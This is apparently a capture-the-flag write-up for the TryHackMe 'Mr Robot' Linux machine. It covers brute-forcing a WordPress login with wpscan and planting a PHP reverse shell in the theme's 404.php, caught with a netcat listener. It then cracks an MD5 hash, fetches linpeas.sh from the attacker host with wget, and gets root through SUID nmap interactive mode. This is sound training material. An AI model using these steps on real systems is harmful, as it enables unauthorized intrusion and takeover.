This machine from [TryHackMe](https://tryhackme.com/room/mrrobot) (thanks to [Leon Johnson](https://twitter.com/sho_luv) ) is categorized as a “medium” Linux machine. The enumeration part stared with an nmap scan that showed that theserver was hosting a website. Further investigation showed that wordpress installed on the webserver. Exploiting the wordpress installation gave a shell to the machine. Further enumeration got me user access from a file containing a password hash that I was able to crack. Root access was gained with nmap that was able to run in interactive mode with higher privileges.

## [](#header-2)Enumeration

## [](#header-3)Nmap

I started with an nmap scan to get a list of running services on the machine.

```
sudo nmap -sC -sV -Pn -oA nmap/nmap 10.10.105.221 
```

![](Pictures/MrRobot/nmap.png)

The output shows that the machine had a webserver.

## [](#header-3)The website

Visiting the website by typing the machine IP into the browser.

There are some interactive choices on the site but they are not interesting.

## [](#header-3)Gobuster

To get some more information about the structure of the website I used gobuster.

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.105.221 -x html,php,txt 
```

![](Pictures/MrRobot/gobuster.png)

Here I saw that the webserver was hosting a wordpress site. There was also a file of interest, robots.txt.

![](Pictures/MrRobot/robots.png)

The robots.txt was pointing at two textfiles, I download them both.The content of ‘key-1-of-3.txt’ was the first key and ‘fsocity.dic’ seemed to be a wordlist.

## [](#header-3)Wordpress

I took a closer look at the wordpress login site (/login).

![](Pictures/MrRobot/wp1.png)

I was trying with admin:admin.

![](Pictures/MrRobot/wp2.png)

I’ve got the following error message: *‘ERROR: Invalid username. Lost your password?’*

The message show that the username is incorrect. So I wanted to try with some other usernames. The machine is inspired from the TV-serie Mr. Robot, so I wanted to try some names from the serie. I found a [website](https://mrrobot.fandom.com/wiki/Characters) that lists some of the characters from the serie.

```

From this list of characters I was able to build a small wordlist.

```

```

I saved the list of users to a file, users.txt. With this list together with the fsocity.dic, I should be able to do a bruteforce with Wpscan against the login page.

## [](#header-3)fsocity.dic

Before I started the bruteforce I took a look at the fsocity.dic file. By doing a quick cat and sort on the file I saw that it contained multiple copy’s of every word. There is no point of testing the same password more than one time. So I got rid of all the copy’s by typing following command.

```
less fsocity.dic | sort | uniq > pass.txt
```

![](Pictures/MrRobot/fscocity.png)

Then I compared the two files and as you can see there was a lot of copy’s in the original file.

## [](#header-3)WPscan

My next step was to run this two lists against the wordpress loginsite with WPscan.

```
wpscan --url http://10.10.105.221 -t 50 -U users.txt -P pass.txt
```

![](Pictures/MrRobot/wpscan.png)

After some time I got some creds for the wordpress login. The image above show’s that the bruteforce was successful.

## [](#header-2)Exploitation

## [](#header-3)Reverse shell

I was now able to use the credentials to log in to the wordpress interface.

![](Pictures/MrRobot/wp3.png)

So the next step was to try to get a shell from the webserver. I had control of the wordpress site and I was able to edit the code on the site. I was able to edit the 404.php page, the page that usually show when a user I trying to visit a page that doesn’t exist on the server. I wanted to edit the page and put code for a php shell instead of the default content. I did a search in my Kali machine to see if I had some php-reverse-shells:

```
locate php-reverse
```

![](Pictures/MrRobot/locate1.png)

I copied the one on the top to my working directory.

```
cp /usr/share/beef-xss/modules/exploits/m0n0wall/php-reverse-shell.php .
```

After that I had to edit the file and put the IP-address and port to my Kali machine.
![](Pictures/MrRobot/phpshell.png)

The next step was to copy the all of the content from the file andreplace everything inside if the 404.php. Then just press ‘Update File’.
![](Pictures/MrRobot/edittheme.png)

At this point I needed a listener on my machine and I had to use the same port that I put in the php-code, 1337. To start a listener I used netcat as the following:

```
nc -lvnp 1337
```

Now I just visited a site on the server that I didn’t think would exist to trigger the 404.php page.
![](Pictures/MrRobot/404.png)

The site is blank. I took a look at my listener and saw that I gota shell :).
![](Pictures/MrRobot/netcat.png)

## [](#header-3)User access

The next step was to upgrade the shell to get it more interactive.

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](Pictures/MrRobot/daemon.png)

I did some quick enumeration and found that the user robot exists on the system. I went to the home folder of robot and listed the files.

![](Pictures/MrRobot/hash.png)

I saw two files. I didn’t have the permission to read the txt file. The other file, password.raw-md5, contained what seemed to be a MD5-hash. So I tried to crack it. I was using hashcat from my Windows host machine to get some help from my GPU.

```
hashcat.exe -a 0 -m 0 THE_CONTENT_FROM_THE_HASHFILE C:\Wordlist\*
```

![](Pictures/MrRobot/hashcat.png)

I was able to crack the hash with one of my wordlists. Now I was able to change to the user robot and read the file ‘key-2-of-3.txt’.

```
su robot
```

![](Pictures/MrRobot/user.png)

![](Pictures/MrRobot/userflag.png)

## [](#header-3)Root access

I did some enumeration as the user robot with a script called [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite). I visited the github page and downloaded the script.
![](Pictures/MrRobot/github.png)

```
git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
```

Now I had the file’s downloaded to my machine. I navigated into the folder ‘privilege-escalation-awesome-scripts-suite/linPEAS’ and started a python webserver:

```
python -m SimpleHTTPServer
```

![](Pictures/MrRobot/python.png)

By doing this I was able to get the script over to the target machine very easy.As the user robot on the target machine, I navigated to /tmp directory and then download linpeas.sh with the tool wget, from myKali machine.

```
wget 10.8.100.211:8000/linpeas.sh
```

![](Pictures/MrRobot/wget.png)

Then I did the script executable, and ran it.

```
chmod +x linpeas.sh
```

```
./linpeas.sh
```

![](Pictures/MrRobot/linpeas.png)

I got a lot of output and I was looking for something that might be interesting.
![](Pictures/MrRobot/suid.png)

I found that nmap might me interesting because it seems that it has [suid](https://www.linuxnix.com/suid-set-suid-linuxunix/) set to be running as a higher privilege. So I tried an old trick with nmap and ran it with interactive modeto get root access.

```
nmap --interactive 
```

```
!sh
```

![](Pictures/MrRobot/nmapint.png)

Now I was able to read the content of the /root directory and get the last flag.
